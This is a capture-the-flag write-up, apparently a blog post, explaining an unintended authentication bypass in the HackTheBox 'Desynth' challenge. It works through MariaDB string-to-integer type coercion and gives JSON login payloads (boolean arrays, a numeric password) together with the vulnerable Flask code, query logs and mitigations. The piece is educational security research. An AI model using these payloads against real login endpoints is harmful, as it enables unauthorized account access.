# Hackthebox Business CTF 2023 - Desynth Unintended Solution - Type Confusion Attack

## Introduction
Desynth was a medium web category challenge from the 2023 Hackthebox Business CTF. The intended solution involved targeting Werkzeug for a desync attack. During the post event discussions, someone with the username of ikerl mentioned they got 'a strange sqli' to successfully login as the admin. My initial test also succeeded to login as the admin user and was able to then proceed with the second part of the challenge; which was utilizing a path traversal vulnerability in the `ipc_download` route to retrieve the mac address, random boot id, and cgroup so the Werkzeug debug console pin could be reproduced. When attempting to demonstrate the solution later on another computer, it did not work. The fact that it wasn't consistent was puzzling, so I decided to do some digging. 

## 1. Initial Unintended solution
The payload that worked for successfully authenticating as an admin was:
```
POST /api/login HTML/1.1

...
Content-Type: application/json

{
    "username": [false],
    "password": [false]
}
```

This would respond with a session cookie for the admin user. 

## 2. The environment
- Flask 2.1.0 
- mysqlclient 2.1.1
- mariadb 10.11.4

Login Endpoint:
```python
@api.route('/login', methods=['POST'])
def api_login():
    if not request.is_json:
        return response('Invalid JSON!'), 400
    
    data = request.get_json()
    username = data.get('username', '')
    password = data.get('password', '')
    
    if not username or not password:
        return response('All fields are required!'), 401
    
    user = login_user_db(username, password)
    
    if user:
        session['auth'] = user
        return response('Logged In sucessfully'), 200
        
    return response('Invalid credentials!'), 403
```

Database functions:
```python
def query(query, args=(), one=False):
    cursor = mysql.connection.cursor()
    cursor.execute(query, args)
    rv = [dict((cursor.description[idx][0], value)
        for idx, value in enumerate(row)) for row in cursor.fetchall()]
    return (rv[0] if rv else None) if one else rv


def login_user_db(username, password):
    user = query('SELECT username FROM users WHERE username = %s AND password = %s', (username, password,), one=True)
    
    if user:
        token = create_JWT(user['username'])
        return token
    else:
        return False
```

## 3. Root Cause Analysis
The assumption was that `false` was being interpreted as a boolean value and not being formatted into the query string as intended by the code. This was confirmed by enabling logging on mysql to see the executed query. 

```sql
MariaDB [(none)]> SET GLOBAL general_log = "ON";
Query OK, 0 rows affected (0.001 sec)

MariaDB [(none)]> SHOW VARIABLES LIKE 'general_log_file';
+------------------+------------------+
| Variable_name    | Value            |
+------------------+------------------+
| general_log_file | 2d0acabc699a.log |
+------------------+------------------+
1 row in set (0.002 sec)
```

When examining the log the query is revealed to be:
```sql
SELECT username FROM users WHERE username = (0) and password = (0);
```

The `users` table at the time of investigation was: 
```sql
MariaDB [web_desynth_recruit]> select id, username, password from users;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | 8ddbd719fcefe4960eb426aada20f825 |
|  2 | reidB    | 84272201880d8473e169b46ab0a50719 |
+----+----------+----------------------------------+
2 rows in set (0.001 sec)
```

I then added a user of `test:test` and when I attempted the sql query it succeeded. 

```sql
MariaDB [web_desynth_recruit]> select * from users where username = 0 and password = 0;
+----+----------+----------+-----------+------+---------------+------+------+-----------+-----------+---------------+------+---------------+--------------+
| id | username | password | full_name | issn | qualification | bio  | iexp | meta_desc | is_public | meta_keywords | bots | ipc_submitted | ipc_verified |
+----+----------+----------+-----------+------+---------------+------+------+-----------+-----------+---------------+------+---------------+--------------+
|  3 | test     | test     |           |      |               |      |      |           |           |               |      | 0             | 0            |
+----+----------+----------+-----------+------+---------------+------+------+-----------+-----------+---------------+------+---------------+--------------+
1 row in set, 6 warnings (0.001 sec)
```
Searching online resulted in an article on [exploit.db](https://www.exploit-db.com/docs/english/41275-mysql-injection-in-update,-insert,-and-delete.pdf) by Osanda Jayathissa that was useful. This article explained how strings were interpretted as a 0 or 0.0 to be more precise but this did not explain the why it was not working for the two preconfigured users. 

I did notice 6 warnings as a result of the query so I checked the warnings. 
```sql
MariaDB [web_desynth_recruit]> show warnings;
+---------+------+-----------------------------------------------------------------------+
| Level   | Code | Message                                                               |
+---------+------+-----------------------------------------------------------------------+
| Warning | 1292 | Truncated incorrect DECIMAL value: 'admin'                            |
| Warning | 1292 | Truncated incorrect DECIMAL value: '8ddbd719fcefe4960eb426aada20f825' |
| Warning | 1292 | Truncated incorrect DECIMAL value: 'reidB'                            |
| Warning | 1292 | Truncated incorrect DECIMAL value: '84272201880d8473e169b46ab0a50719' |
| Warning | 1292 | Truncated incorrect DECIMAL value: 'test'                             |
| Warning | 1292 | Truncated incorrect DECIMAL value: 'test'                             |
+---------+------+-----------------------------------------------------------------------+
6 rows in set (0.000 sec)
```

After some searching around it appears that SQL is casting the string as a signed integer for the comparison automatically. 
```sql
MariaDB [web_desynth_recruit]> select cast('8ddbd719fcefe4960eb426aada20f825' as SIGNED) as converted_value;
+-----------------+
| converted_value |
+-----------------+
|               8 |
+-----------------+
1 row in set, 1 warning (0.000 sec)

MariaDB [web_desynth_recruit]> select cast('84272201880d8473e169b46ab0a50719' as SIGNED) as converted_value;
+-----------------+
| converted_value |
+-----------------+
|     84272201880 |
+-----------------+
1 row in set, 1 warning (0.000 sec)

MariaDB [web_desynth_recruit]> show warnings;
+---------+------+-----------------------------------------------------------------------+
| Level   | Code | Message                                                               |
+---------+------+-----------------------------------------------------------------------+
| Warning | 1292 | Truncated incorrect INTEGER value: '84272201880d8473e169b46ab0a50719' |
+---------+------+-----------------------------------------------------------------------+
1 row in set (0.000 sec)
```
This results in the same warning and we can see that SQL will start at the left most character and take any digits up to the first alphabetic character. 
Given this fact we can attempt to login as the admin user with a payload of:
```json
{
    "username": "admin",
    "password": 8
}
```

And we have admin!
```json
{
  "message": "Logged In sucessfully"
}
```

If we update the password to start with an alphabetic character it allows us to login with numeric `0` as the password value. 
```sql
MariaDB [web_desynth_recruit]> UPDATE users SET password = 'P@$$w0rd!8398709856' WHERE username = 'admin';
Query OK, 1 row affected (0.001 sec)
Rows matched: 1  Changed: 1  Warnings: 0

MariaDB [web_desynth_recruit]> select cast(password as SIGNED) from users where username = 'admin';
+--------------------------+
| cast(password as SIGNED) |
+--------------------------+
|                        0 |
+--------------------------+
1 row in set, 1 warning (0.001 sec)

MariaDB [web_desynth_recruit]> show warnings;
+---------+------+----------------------------------------------------------+
| Level   | Code | Message                                                  |
+---------+------+----------------------------------------------------------+
| Warning | 1292 | Truncated incorrect INTEGER value: 'P@$$w0rd!8398709856' |
+---------+------+----------------------------------------------------------+
1 row in set (0.000 sec)
```
## 3. Ramifications
This type confusion can allow for much easier "password" bruteforcing reducing the possible dictionary to only 0-9 characters and the length to the index of the first alphabetic character. 

## 4. Mitigation and Remediation
This attack would be mitigated by already well defined best practices of input sanitization and the use of parameterized queries. Also storing of plaintext passwords is also a terrible idea. The password should be hashed with a secure algorithm and a unique salt value. 

## Conclusion
This unintended solution turned out to be quite the rabbit hole and rather fun to research. 

TLDR; 
Don't store plaintext passwords. 
And SQL does dumb things when comparing strings and integers. 

Now go hack some stuff!
